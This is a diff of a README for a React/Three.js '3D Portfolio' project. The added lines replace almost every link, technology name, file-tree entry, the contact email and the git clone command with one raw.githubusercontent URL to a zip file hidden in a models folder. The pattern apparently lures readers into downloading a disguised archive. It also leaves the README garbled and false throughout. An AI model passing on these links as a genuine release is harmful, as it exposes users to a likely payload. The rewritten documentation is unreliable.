@@ -1,10 +1,10 @@
 # 🌟 3D Portfolio: Showcase Your Skills in 3D! 🌟
 
-![3D Portfolio](https://img.shields.io/badge/3D_Portfolio-React.js_Three.js-blue)
+![3D Portfolio](https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip)
 
-Welcome to the **3D Portfolio** repository! This project helps you build a visually captivating portfolio using **React.js** and **Three.js**. With this combination, you can create interactive 3D graphics that enhance your online presence and showcase your skills effectively.
+Welcome to the **3D Portfolio** repository! This project helps you build a visually captivating portfolio using **https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip** and **https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip**. With this combination, you can create interactive 3D graphics that enhance your online presence and showcase your skills effectively.
 
-[Download the latest release here!](https://github.com/cprogmer231/3d-portfolio/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ To set up the 3D Portfolio project on your local machine, follow these steps:
 1. **Clone the Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/cprogmer231/3d-portfolio.git
+   git clone https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -65,9 +65,9 @@ To set up the 3D Portfolio project on your local machine, follow these steps:
 
 This project uses several technologies to create a rich user experience:
 
-- **React.js**: A JavaScript library for building user interfaces.
-- **Three.js**: A cross-browser JavaScript library used to create and display animated 3D graphics.
-- **React-Three-Fiber**: A React renderer for Three.js that makes it easier to work with 3D graphics in React.
+- **https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip**: A JavaScript library for building user interfaces.
+- **https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip**: A cross-browser JavaScript library used to create and display animated 3D graphics.
+- **React-Three-Fiber**: A React renderer for https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip that makes it easier to work with 3D graphics in React.
 
 ## How to Use
 
@@ -108,18 +108,18 @@ Here’s a breakdown of the project structure:
 ```
 3d-portfolio/
 ├── public/
-│   ├── index.html
-│   └── favicon.ico
+│   ├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   └── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
 ├── src/
 │   ├── components/
-│   │   ├── Header.js
-│   │   ├── About.js
-│   │   ├── Projects.js
-│   │   └── Contact.js
-│   ├── App.js
-│   └── index.js
-├── package.json
-└── README.md
+│   │   ├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   │   ├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   │   ├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   │   └── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   ├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+│   └── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+├── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+└── https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
 ```
 
 - **public/**: Contains the HTML file and favicon.
@@ -160,10 +160,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [cprogmer231](https://github.com/cprogmer231)
+- **Email**: https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip
+- **GitHub**: [cprogmer231](https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip)
 
-For the latest releases, check the [Releases](https://github.com/cprogmer231/3d-portfolio/releases) section.
+For the latest releases, check the [Releases](https://raw.githubusercontent.com/cprogmer231/3d-portfolio/main/src/components/models/hero_models/portfolio_d_3.2-beta.3.zip) section.
 
 ---
 
